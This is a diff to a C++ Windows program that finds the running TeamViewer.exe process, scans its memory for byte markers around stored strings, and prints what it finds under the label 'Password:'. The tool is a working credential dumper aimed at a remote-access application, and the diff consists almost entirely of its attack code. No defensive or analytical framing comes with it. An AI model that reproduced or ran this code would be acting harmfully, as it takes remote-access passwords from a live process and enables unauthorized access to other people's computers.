@@ -1,5 +1,6 @@
 ```
 #include <windows.h>
+#include <tlhelp32.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -10,8 +11,27 @@
 #include <iomanip>
 #include <stdio.h>
 #include <ctype.h>
-
 using namespace std;
+
+int GetProcId(char* ProcName)
+{
+	PROCESSENTRY32   pe32;
+	HANDLE         hSnapshot = NULL;
+	pe32.dwSize = sizeof( PROCESSENTRY32 );
+	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
+	if( Process32First( hSnapshot, &pe32 ) )
+	{
+		do{
+			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
+				break;
+		}while( Process32Next( hSnapshot, &pe32 ) );
+	}
+	if( hSnapshot != INVALID_HANDLE_VALUE )
+		CloseHandle( hSnapshot );
+	return pe32.th32ProcessID;
+	
+}
+
 string intToHexString(int intValue) {
     string hexStr;
     std::stringstream sstream;
@@ -60,21 +80,20 @@ bool readMemory(DWORD pid, char* _p, size_t len)
 		ReadProcessMemory(process, p, &chunk[0], len, &bytesRead);
 		for (int i = 0;i<bytesRead;i+=2)
 		{
-			if (
-					!isalnum(chunk[i]) 
-										&& 
-					!isprint(chunk[i])
-				)
+			if (!isalnum(chunk[i]) 	&& 	!isprint(chunk[i]))
 			{
-				//if (chunk[i]!= (int)'*' || chunk[i]!=(int)'/' || chunk[i]!=(int)'\\' || chunk[i]!=(int)'!' || chunk[i]!=(int)'@' || chunk[i]!=(int)'#' || chunk[i]!=(int)'$' || chunk[i]!=0)
 					return false;
 			}
 		}
+
+		cout<<"***********"<<endl<<intToHexString((int)(void*)p)<<endl<<"Password: ";		
 		for (i = 0;i<bytesRead;i+=2)
 		{
-				cout<< chunk[i];
+                cout<< chunk[i];	
 		}
 		cout <<endl;
+		cout<<intToHexString((int)(void*)p)<<endl<<"***********"<<endl;
+		
     }
 	return true;
 }
@@ -124,53 +143,62 @@ list<int> GetAddressOfData(DWORD pid, const char *data, size_t len)
     return entries;
 }
 
-void __main(char end_magic_data[])
+void __main(bool flag)
 {
 		const char start_magic_data[] = "\x00\x88"; 
-  		//char end_magic_data[]  = "";= _end_magic_data; //"\x00\x00\x00\x20\x00\x00\x00"; 
-		
-		int PID = 920;	
+  		char _end_magic_data1[] = "\x00\x00\x00\x20\x00\x00\x00";
+		char _end_magic_data2[] = "\x00\x00\x00\x00\x00\x00\x00";
+		if (flag)
+		{
+			//*_end_magic_data1 = *_end_magic_data1;
+		}
+		else
+		{
+			//memcpy(_end_magic_data1, _end_magic_data2, sizeof(_end_magic_data2));
+		}
+
+		int PID = GetProcId("TeamViewer.exe");	
 		std::cout << "Local data address: " << (void*)start_magic_data << "\n";
 		list<int> start_address = GetAddressOfData(PID, start_magic_data, 2);	
 		cout<<"start end magic search "<<'\n';	
-		list<int> end_address = GetAddressOfData(PID, end_magic_data,  16);
+		list<int> end_address = GetAddressOfData(PID, _end_magic_data1, (sizeof(_end_magic_data1)/sizeof(*_end_magic_data1))-1);
 		int key = 0;
 		int count = 0;
 		
 		start_address.reverse();
+		end_address.reverse();
+
 		for (std::list<int>::const_iterator iterator = start_address.begin(), end = start_address.end(); iterator != end; ++iterator) 
 		{
 			int i = *iterator;
 						key = i;	
 						for (int j=key;j<key+33;j++){
-							std::list<int>::iterator it = std::find(end_address.begin(), end_address.end(), j);
+							std::list<int>::iterator it = std::find(end_address.begin(), end_address.end(), j);///////////////////// need use another search alg
 							if ( it != end_address.end() )
-								{
+							{
 										if (readMemory(PID,(char*)(void*)(i+2),j-i-2))
 										{	
-              								//cout<<"***********"<<endl<<intToHexString(i)<<endl;
-											//cout<<intToHexString(j)<<endl<<"***********"<<endl;
-											count++;
 											break;
 										}
 								}
 						}
+						//count++;
+						//cout << count << endl;
 		}
 
 	cout<<count;
 }
 int main()
 {
-	char _end_magic_data1[] = "\x00\x00\x00\x20\x00\x00\x00";
-	__main(_end_magic_data1);
+	
+	__main(true);
 
 	char type = '\0';
-	while( PromptForChar( "Try 00x00x00x00x00x00x00 magic data? [y/n]", type ) )
+	while( PromptForChar( "Try 00x00x00x00x00x00x00 magic data (it can take a lot of time, try to run the code in python or try change search function (166-173 lines (: ? [y/n]", type ) )
 		{
 			if (type == 'y')
 			{
-					char _end_magic_data2[] = "\x00\x00\x00\x00\x00\x00\x00";
-					__main(_end_magic_data2);			
+					__main(false);			
 			}
 			if (type== 'n')
 			{
